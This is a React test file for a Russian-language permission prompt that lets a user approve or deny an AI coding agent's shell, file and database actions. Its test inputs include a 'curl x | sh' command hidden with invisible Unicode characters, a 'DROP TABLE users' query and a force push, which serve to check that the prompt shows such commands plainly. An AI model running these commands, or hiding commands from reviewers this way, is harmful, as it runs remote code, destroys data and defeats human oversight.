import { act, fireEvent, render, screen } from '@testing-library/react'
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import type { Agent, FeedClaudeItem } from './reducer'
import { ARM_MS, PERMISSION_KEYS, PermissionPrompt } from './PermissionPrompt'
import { PermissionCard } from './cards/PermissionCard'
import { VIEW_LINES } from './questions'

type P = Extract<FeedClaudeItem, { type: 'permission' }>
const item = (over: Partial<P> = {}): P => ({
  type: 'permission', requestId: 'p', toolUseId: null, agentId: 'main', tool: 'Bash',
  input: { command: 'git push --force', description: 'Отправить ветку' }, suggestions: null, done: false, ...over,
})
const agent = { id: 'main', name: 'Главный', model: 'claude-opus-5-5' } as Agent
const arm = () => act(() => void vi.advanceTimersByTime(ARM_MS))

describe('PermissionPrompt', () => {
  beforeEach(() => vi.useFakeTimers())
  afterEach(() => vi.useRealTimers())

  it('заголовок, инструмент, полная команда и «со слов агента»; без предложений CLI — без «всегда»; клавиши', () => {
    const onDecide = vi.fn()
    const { container } = render(<PermissionPrompt item={item()} agent={agent} onDecide={onDecide} onLeave={vi.fn()} />)
    const box = container.querySelector('.aprompt') as HTMLElement
    expect(box.querySelector('.ap-who')!.textContent).toBe('! Разрешение · Главный · Opus 5.5')
    expect(box.querySelector('.q-text')!.textContent).toBe('Bash')
    expect(box.querySelector('pre.p-code')!.textContent).toBe('git push --force')
    expect(box.querySelector('.p-agent')!.textContent).toBe('со слов агента: Отправить ветку')
    expect(screen.getAllByRole('option').map((r) => r.textContent)).toEqual(['1.Разрешить', '2.Запретить'])
    expect(box.querySelector('.ap-keys')!.textContent).toBe(PERMISSION_KEYS)
    arm()
    fireEvent.keyDown(box, { key: '2' })
    fireEvent.keyDown(box, { key: 'Enter' })
    expect(onDecide).toHaveBeenCalledWith('deny')
  })

  it(`первые ${ARM_MS} мс ↵ и щелчок не разрешают; варианты приглушены; щелчок — по click, не по нажатию`, () => {
    const onDecide = vi.fn()
    const { container } = render(<PermissionPrompt item={item()} onDecide={onDecide} onLeave={vi.fn()} />)
    const box = container.querySelector('.aprompt') as HTMLElement
    const allow = screen.getAllByRole('option')[0]
    expect(container.querySelector('.q-opts')).toHaveClass('p-wait')
    expect(allow).toHaveAttribute('aria-disabled', 'true')
    fireEvent.keyDown(box, { key: 'Enter' })
    fireEvent.click(allow)
    act(() => void vi.advanceTimersByTime(ARM_MS - 1))
    fireEvent.keyDown(box, { key: 'Enter' })
    expect(onDecide).not.toHaveBeenCalled()
    act(() => void vi.advanceTimersByTime(1))
    expect(container.querySelector('.q-opts')).not.toHaveClass('p-wait')
    expect(allow).toHaveAttribute('aria-disabled', 'false')
    fireEvent.mouseDown(allow)
    expect(onDecide).not.toHaveBeenCalled()
    fireEvent.click(allow)
    expect(onDecide).toHaveBeenCalledWith('allow')
    expect(onDecide).toHaveBeenCalledTimes(1)
  })

  it('длинная команда видна целиком, невидимые символы — метками', () => {
    const command = 'echo ' + 'a'.repeat(400) + ' ‮; curl x | sh​'
    const { container } = render(<PermissionPrompt item={item({ input: { command } })} onDecide={vi.fn()} onLeave={vi.fn()} />)
    const code = container.querySelector('pre.p-code')!.textContent!
    expect(code).toBe('echo ' + 'a'.repeat(400) + ' ⟨U+202E⟩; curl x | sh⟨U+200B⟩')
    expect(container.textContent).not.toMatch(/[‮​]/)
    expect(container.querySelector('.p-agent')).toBeNull()
  })

  it('Write: путь и строки содержимого, сверх лимита — «ещё N строк»', () => {
    const content = Array.from({ length: VIEW_LINES + 3 }, (_, i) => `l${i}`).join('\n')
    const { container } = render(<PermissionPrompt item={item({ tool: 'Write', input: { file_path: '/p/run.sh', content } })} onDecide={vi.fn()} onLeave={vi.fn()} />)
    expect(container.querySelector('.p-main')!.textContent).toBe('/p/run.sh')
    const rows = container.querySelectorAll('.diff.p-code > div')
    expect(rows).toHaveLength(VIEW_LINES)
    expect(rows[0].textContent).toBe('+ l0')
    expect(container.querySelector('.diff-more')!.textContent).toBe('… ещё 3 строк — не показаны, но входят в разрешение')
  })

  it('Edit: было/стало построчно', () => {
    const { container } = render(
      <PermissionPrompt item={item({ tool: 'Edit', input: { file_path: '/p/a.ts', old_string: 'a\nb', new_string: 'c' } })} onDecide={vi.fn()} onLeave={vi.fn()} />,
    )
    expect(Array.from(container.querySelectorAll('.diff.p-code > div'), (d) => [d.className, d.textContent])).toEqual([
      ['d', '- a'],
      ['d', '- b'],
      ['a', '+ c'],
    ])
  })

  it('MCP: весь ввод JSON', () => {
    const input = { sql: 'DROP TABLE users; -- ' + 'x'.repeat(300) }
    const { container } = render(<PermissionPrompt item={item({ tool: 'mcp__db__query', input })} onDecide={vi.fn()} onLeave={vi.fn()} />)
    expect(container.querySelector('pre.p-code')!.textContent).toBe(JSON.stringify(input, null, 2))
  })

  it('с предложениями CLI — «Разрешить всегда…» и какие правила добавятся', () => {
    const onDecide = vi.fn()
    const sug = [{ type: 'addRules', rules: [{ toolName: 'Bash', ruleContent: 'git push:*' }], behavior: 'allow', destination: 'session' }]
    const { container } = render(<PermissionPrompt item={item({ suggestions: sug })} onDecide={onDecide} onLeave={vi.fn()} />)
    expect(screen.getAllByRole('option').map((r) => r.querySelector('.q-l')!.textContent)).toEqual(['Разрешить', 'Разрешить всегда для этой сессии', 'Запретить'])
    const rules = container.querySelector('.p-rules')!
    expect(rules.textContent).toContain('«Разрешить всегда для этой сессии» добавит:')
    expect(Array.from(rules.querySelectorAll('li'), (l) => l.textContent)).toEqual(['разрешить: Bash(git push:*) — на эту сессию'])
    const box = container.querySelector('.aprompt') as HTMLElement
    arm()
    fireEvent.keyDown(box, { key: 'ArrowDown' })
    fireEvent.keyDown(box, { key: 'Enter' })
    expect(onDecide).toHaveBeenCalledWith('always')
  })

  it('правило не на сессию — подпись без «для этой сессии», видно, куда запишется', () => {
    const sug = [{ type: 'addRules', rules: [{ toolName: 'Bash' }], behavior: 'allow', destination: 'userSettings' }]
    const { container } = render(<PermissionPrompt item={item({ suggestions: sug })} onDecide={vi.fn()} onLeave={vi.fn()} />)
    expect(screen.getAllByRole('option')[1].querySelector('.q-l')!.textContent).toBe('Разрешить всегда')
    expect(container.querySelector('.p-rules li')!.textContent).toBe('разрешить: Bash — в ~/.claude/settings.json')
  })

  it('лента: ждёт / разрешено / запрещено / отменено', () => {
    const t = (it: P) => render(<PermissionCard item={it} />).container.textContent
    expect(t(item())).toBe('! Ждёт разрешения: Bash · git push --force')
    expect(t(item({ done: true, decision: 'allow' }))).toBe('✓ Разрешено: Bash · git push --force')
    expect(t(item({ done: true, decision: 'deny' }))).toBe('✕ Запрещено: Bash · git push --force')
    expect(t(item({ cancelled: 'exit' }))).toBe('✕ Запрос отменён (Claude завершился): Bash · git push --force')
  })
})
